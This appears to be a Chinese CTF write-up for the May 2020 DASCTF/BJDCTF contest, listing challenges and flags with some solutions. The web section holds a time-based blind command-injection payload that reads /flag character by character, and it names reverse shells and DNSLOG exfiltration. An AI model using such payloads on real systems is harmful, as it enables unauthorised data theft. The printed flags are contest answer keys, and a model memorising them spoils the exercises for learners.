# 安恒五月线上赛（DASCTF）&&第三届BJDCTF

## 比赛信息

> 任务描述：2020年DASCTF五月线上赛
>
> 进行时间：2020-5-22 11:00 -- 2020-5-23 23:00 晚上暂停
>
> 官方writeup收集：https://shimo.im/docs/DRgjXTH3cJjrHKcw



## 题目信息

### WEB

#### 帮帮小红花（100）

> 明明都已经有了黑页，为啥我不能上车呢？flag为/flag文件内容的md5值
>
> hint1：防火墙
>
> 183.129.189.60:10069,10070,10071,10072,10073,10074

其他writeup:

- https://www.cnblogs.com/h3zh1/p/12945275.html

无回显命令执行，主要有这几个方法：DNSLOG、curl上传文件、反弹shell、sleep盲注

经过测试sleep可用，然后只需要拼出可用的shell命令就行了

```python
# 上面writeup中的
playload = '''h3zh1=$( cat /flag | cut -c %d-%d );if [ $( printf '%%d' "'$h3zh1" ) -gt %d ];then sleep %f;fi''' % ( i, i, mid, SLEEP_TIME)

# 下面我用的
# 直接${flag:0:1}截取字符不好使，这里变通了一下使用${flag#fl}和${#lll}通过截取字符串判断长度
# lll是模糊截取后面的字符串，i从大到小，当sleep 3时，字符c就在倒数第i位上
playload = 'fflag=`cat /flag`;lll=${fflag#*s_great*%s};if [ ${#lll} -ge %d ];then sleep 3;fi'%(c,i)
```

```
BJD{make_iptables_great_again}
```



#### gob（200）

> php是世界上最好的语言
>
> 183.129.189.60:10063,10064,10065,10066,10067,10068



#### Multiplayer Sports（200）

> 以前只知道小明喜欢CTF，没想到他最喜欢的是多人运动。
>
> 183.129.189.60:10112,10113,10114,10115,10116,10117



#### 布吉岛（200）

> 作为布吉岛公司的安全人员，你能测试出网站的漏洞吗？ (话说，这题为啥要给俩端口呢？） flag为/flag文件内容的md5值
>
> hint1：反射！
>
> 183.129.189.60:10049,10050

附加下载：2005205ec4f1ac3c59f.zip



#### ezupload（300）

> 看啥，再看就把你mikumiku掉！
>
> 183.129.189.60:10057,10058,10059,10060,10061,10062



#### 老开发（200）

> 哈哈，我学会使用orm啦！$flag=md5(strtoupper("flag{xxx}"));
>
> 183.129.189.60:10000



#### notes（300）

> 【请务必仔细阅读题目描述】内网信息：题目运行在172.26.176.1:80，管理员在172.26.176.2 
>
> tips:
>
> ①不排除因用户过多而出现的意外情况，建议如果本地打通而远程打不到的话多提交几次；
>
> ②存在浏览器差异，多次远程不通，请更换payload；
>
> ③请提交BJD{}大括号内的哈希值。
>
> 183.129.189.60:10048



### PWN

#### TaQiniOJ-0（100）

> 欢迎来到TaQini的C语言新手训练营
>
> 183.129.189.60:10075,10076,10077,10078,10079,10080



#### Memory Monster I（100）

> Memory Monster is eating your memory!
>
> 183.129.189.60:10081,10082,10083,10084,10085,10086

附加下载：2005205ec4f1a2eeb94.zip



#### Memory Monster II（150）

> Memory Monster is eating your memory!
>
> 183.129.189.60:10100,10101,10102,10103,10104,10105

附加下载：2005205ec4f1a3ac91d.zip



#### happyending（300）

> 作为系列的终结,菜单题,久违了
>
> 183.129.189.60:10106,10107,10108,10109,10110,10111

附加下载：2005205ec4f1a1b49e0.zip



#### Secret 2（200）

> tooooooo many secrets! 
>
> Hotfix 2020年05月22日09:04:54：请忽略下面的附件，正确的附件下载地址为 
>
> http://dd.zhaoj.in/dasctfmay/secret2%20(1) 
>
> 备用附件链接: https://pan.baidu.com/s/1r2p55XRFT3kQnpZg6iCaYQ 提取码: jicg
>
> toooooooo many secret! (✿･ω･)/✉ 
>
> hint① 关注一下读随机数的函数 (//∇//)

附加下载：secret2.zip

废弃附件：2005205ec4f1a58e1f6.zip



#### easybabystack（250）

> so easy. 
>
> HotFix 2020年05月22日09:00:34：请忽略下面的附件，正确的附件在此下载 
>
> http://dd.zhaoj.in/dasctfmay/easybabystack%20(1) 
>
> 备用附件链接: https://pan.baidu.com/s/1b9_L_uTS9Xmva8fm2HF2GA 提取码: qhwf

附加下载：easybabystack.zip

废弃附件：2005205ec4f1a2a0bb0.zip



#### TaQiniOJ-1（250）

> 欢迎来到TaQini的C语言魔鬼训练营
>
> 183.129.189.60:10002,10003,10004,10005,10006,10007



#### Memory Monster III（300）

> Memory Monster is eating your memory!
>
> 183.129.189.60:10008,10015,10016,10017,10018,10019

附件下载：2005205ec4f1a421adc.zip



### REVERSE

#### ViQinere（100）

> do you know ViQinère cipher? （请提交flag的md5值）
>
> 183.129.189.60:10087,10088,10089,10090,10091,10092

附加下载：2005205ec4f1a6df1b8.zip



#### BScript（150）

> A Easy PE And A Easy Script 提交32位小写md5(flag)
>
> hint1：这是一个正常的可运行的easy的PE
>
> hint2：情况不止一种！多看几个程序找找规律 
>
> hint3：遇到瓶颈时可以想想：初始化后的全局变量真的一定会在data段上吗

附加下载：2005205ec4f1a7c9c1e.zip



#### MiscVm（150）

> 人生苦短，我用python

附加下载：2005205ec4f1ab0f5ec.zip



#### log1cal（200）

> 小小的与或非，大大的可能性。注意：得到的flag请进行小写32位MD5哈希后提交
>
> hint 1: 化简逻辑运算
>
> hint 2: 理清逻辑运算式结构，它并非杂乱无章。然后用数学上的替换、反代等化简技巧

附加下载：2005205ec4f1ab5bbcd.exe



#### blink（100）

> 一闪一闪亮晶晶~(请将flag经过md5后提交)
>
> hint1: 完整的图案可以扫一扫
>
> hint2: http://taqini.space/2020/04/30/shell-output-control-code

附加下载：2005205ec4de54d16a5.zip



#### Py2（200）

> 出题人是懒狗，并没有写描述

附加下载：2005205ec4f1abbe731.zip



### MISC

#### 2020年DASCTF五月线上赛问卷调查（50）

> 依旧是熟悉的赛题问卷调查哟~问卷地址：https://jinshuju.net/f/D8Lwig 提交 flag{} 括号中的内容！！！

提交后给flag

```
flag{c2979c71244dec2befc6e369941c6546}
```



#### Questionnaire（100）

> 叮~您有一份调查问卷~请查收~ https://forms.gle/Vmzt99LazrtXsRLM9

查看网页源码

```
["Beijing Institute of Technology|BIT"]
["Haolinju|haolinju"]
["Daoxiangcun|daoxiangcun"]
["Jingweizhai|jingweizhai"]
["Jingshan|jingshan"]
["Chaoyang|chaoyang"]
["Hefangkou|hefangkou"]
```

输入信息到表单时会提示对应的错误提示（hex值），hex值按顺序拼起来得到flag

```
d41d8cd98f00b204e9800998ecf8427e
```



#### babyweb（150）

> 请提交flag的md5值
>
> 183.129.189.60:10093,10094,10095,10096,10097,10098

附加下载：flag.zip

`Pass‏‏‍‏‌‏‍‏‏‍‌‏‎‏‏‌‏‏‎‌‏‏‎‏‏‏‏‎‏‍‏‍‏‎‏‍‎‏‏‏‎‌‏‌‏‍‏‏‎‏‌‏‍‏‎‎‏‌‏‎‏‌‎‏‎‏‌‎‏‌word_is_here`

网页中“Password_is_here”中间包含不可见字符，全部复制后url编码（放到url参数中就行）

`Pass%E2%80%8F%E2%80%8F‍%E2%80%8F‌%E2%80%8F‍%E2%80%8F%E2%80%8F‍‌%E2%80%8F%E2%80%8E%E2%80%8F%E2%80%8F‌%E2%80%8F%E2%80%8F%E2%80%8E‌%E2%80%8F%E2%80%8F%E2%80%8E%E2%80%8F%E2%80%8F%E2%80%8F%E2%80%8F%E2%80%8E%E2%80%8F‍%E2%80%8F‍%E2%80%8F%E2%80%8E%E2%80%8F‍%E2%80%8E%E2%80%8F%E2%80%8F%E2%80%8F%E2%80%8E‌%E2%80%8F‌%E2%80%8F‍%E2%80%8F%E2%80%8F%E2%80%8E%E2%80%8F‌%E2%80%8F‍%E2%80%8F%E2%80%8E%E2%80%8E%E2%80%8F‌%E2%80%8F%E2%80%8E%E2%80%8F‌%E2%80%8E%E2%80%8F%E2%80%8E%E2%80%8F‌%E2%80%8E%E2%80%8F‌word_is_here`

去掉首尾，如下规则替换全部，得到长度为196的5进制字符串

```
%E2%80%8B	0
%E2%80%8C	1
%E2%80%8D	2
%E2%80%8E	3
%E2%80%8F	4

0000442000040100004240000421000043400004100000400000043100004040000344000040400003420000424000034200003440000431000040100004240000430000041000004200000433000041000004300000410000034300004130000401
```

每7位转10进制，在转字符得到解压密码：zerowidthcharactersinvisible

解压后图片文件需要反转一下hex，得到图形编码的flag

[解码1](https://www.dcode.fr/chiffre-arthur-minimoys)，[解码2](https://www.dcode.fr/alphabet-galactique-standard)，[解码3](https://www.dcode.fr/dancing-men-cipher)，[解码4](https://www.dcode.fr/pokemon-zarbi-alphabet)，得到flag

```
BJD{UVWHZAITWAU}
```



#### /bin/cat 2（150）

> [CAUTION] cats as numerous as stars are coming... 解出的答案经md5后提交~

附加下载：2005205ec4f1a07a3e9.zip

```
m1ao~miao~mi@o~Mia0~m!aO~m1a0~~~
```



#### testyournc（200）

> Test your nc
>
> hint1: /f1a9.bak 你看到了嘛? 
>
> hint2: 用df命令看看硬盘总共多大，再看看flag多大。
>
> 183.129.189.60:10118,10119,10120,10121,10122,10123

其他writeup:

- https://ytoworld.tk/index.php/archives/100/#testyournc
- https://lazzzaro.github.io/2020/05/24/match-DASCTF-May-%C3%97-BJDCTF-3rd-%E5%AE%89%E6%81%92%E4%BA%94%E6%9C%88%E8%B5%9B/#testyournc



#### manual（400）

> 请使用ssh连接靶机（用户名为ctf，密码详见欢迎信息）
>
> ———— 歡迎使用BJD3rd帮助手册————
>
> 「manual一下，你就知道」 
>
> hint0: 试试linux的man命令，找找不同
>
> hint1: 本题无需提权,请仔细看看根目录下的文件 
>
> hint2: 据说会ps的师傅都做出来了
>
> 183.129.189.60:10125,10126,10127,10128,10129,10130



#### RainbowTable（200）

> 快来投入到伟大的彩虹表建设中来吧！flag为获得的flag的md5值 hint1：好像下溢出没用？那还有什么洞嘛！
>
> 183.129.189.60:10027,10031,10032,10033,10034,10035



#### PY me（300）

> 请提交md5("BJD{xxxx}")； 使用nc连接； 尽量用后面的端口，10020端口不太稳定
>
> 183.129.189.60:10020,10021,10022,10023,10024,10026



### CRYPTO

#### bbcrypto（100）

> its so simple

附加下载：2005205ec4f19d70080.zip

```
flag{ad7d973ffdd285b476a1a727b3a8fbc4}
```



#### Encrypt_Img（200）

> Try to encrypt a picture with RC4

附加下载：2005205ec4f19b9b32a.zip



#### easyLCG（100）

> easy LCG

附加下载：2005205ec4f19c2d6bb.zip

其他writeup:

- https://badmonkey.site/archives/2020-5-dasctf.html
- https://lazzzaro.github.io/2020/05/24/match-DASCTF-May-%C3%97-BJDCTF-3rd-%E5%AE%89%E6%81%92%E4%BA%94%E6%9C%88%E8%B5%9B/#easyLCG

class LCG是“线性同余随机数生成器”，在已知a、b、m和state1、state2的情况下可以逆推出每一步的随机数种子

```python
import gmpy2 as gp

def next(seed):
    seed = (a*seed+b) % m
    return seed >> 16 # 位运算，丢弃了低位的16位2进制，丢弃的值设为k

# state = seed >> 16
# seed = (state << 16) + k

a = 3844066521
b = 3316005024
m = 2249804527
state1 = 16269
state2 = 4249
# state2的计算过程是可以正向爆破的，未知数只有一个k，爆破k，而k的范围是0~2**16，几乎瞬间完成
for k in range(2**16):
    # 使用state1逆运算，得到计算state2用的seed值
    seed = (state1 << 16) + k
    if next(seed) == state2:
        # k能通过判断时，上面的seed也就可能是正确的
        # seed = (a*seed+b) % m，在已知a、b、m和结果的seed值时，可以求模逆得到最初的随机数种子
        print(seed,gp.invert(a,m)*(seed-b)%m)
'''
1066209821 714405490
1066229421 1925643473
1066249021 887076929
1066268621 2098314912
'''
```

这时已经爆破出4个可能的class LCG最初的seed值：714405490、1925643473、887076929、2098314912

理解求模逆的过程还可以参考[这里](https://blog.csdn.net/SSS_Benjamin/article/details/90345614)，其中的`ModReverse(a,n)`相当于上面计算过程中的`gp.invert(a,m)`

有了随机数种子，接下来就没有难度了，把seed代入LCG运行原题目代码，当DH.A, DH.B和题目给出的值相等时，这时的seed就是真正的seed，用DH.key异或密文就能得到明文flag了

```python
from Crypto.Util.number import*

A = 102248652770540219619953045171664636108622486775480799200725530949685509093530
B = 74913924633988481450801262607456437193056607965094613549273335198280176291445
Cipher = 13040004482819935755130996285494678592830702618071750116744173145400949521388647864913527703
for seed in [714405490,1925643473,887076929,2098314912]:
    DH = DH(seed)
    if DH.A == A and DH.B == B:
        print(long_to_bytes(Cipher ^ DH.key))
# flag{4dfe14e0c6c21ffcf5a3b4f0ed1911f6}
```





#### knapsack（200）

> easy knapsack

附加下载：2005205ec4f19c904a2.zip



#### Backpacker（300）

> Only backpackers can get the flag
>
> 183.129.189.60:10036

附加下载：2004225e9ff0cd1c4ea.zip